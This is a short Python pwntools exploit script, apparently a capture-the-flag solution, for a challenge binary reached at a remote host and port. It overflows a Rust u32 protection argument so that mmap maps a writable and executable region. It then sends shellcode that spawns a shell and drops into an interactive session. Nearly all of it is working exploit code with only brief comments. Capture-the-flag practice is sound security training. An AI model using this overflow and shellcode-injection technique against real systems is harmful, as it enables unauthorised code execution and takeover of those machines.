#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
libc = './libi_love_ffi.so'
context.log_level = 'debug'
host, port = 'amt.rs', 31172

def init(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = init()

# https://sites.uclouvain.be/SystInfo/usr/include/bits/mman.h.html
args_addr = 0
args_length = 0x1000 
args_fd = 0
args_flag = 0 
args_offset = 0
#                rust max u32  +   overflow   +  PROT_EXEC + PROT_READ + PROT_WRITE
args_protection = 4294967295   +      1       +      4     +     1     +     2

# setup mmap
io.sendlineafter(b'>', str(args_addr).encode())
io.sendlineafter(b'>', str(args_length).encode())
io.sendlineafter(b'>', str(args_fd).encode())
io.sendlineafter(b'>', str(args_flag).encode())
io.sendlineafter(b'>', str(args_offset).encode())
io.sendlineafter(b'>', str(args_protection).encode())

shellcode = asm(shellcraft.sh())

# shellcode
io.sendline(shellcode)
io.sendlineafter(b'>', b'0')

io.interactive()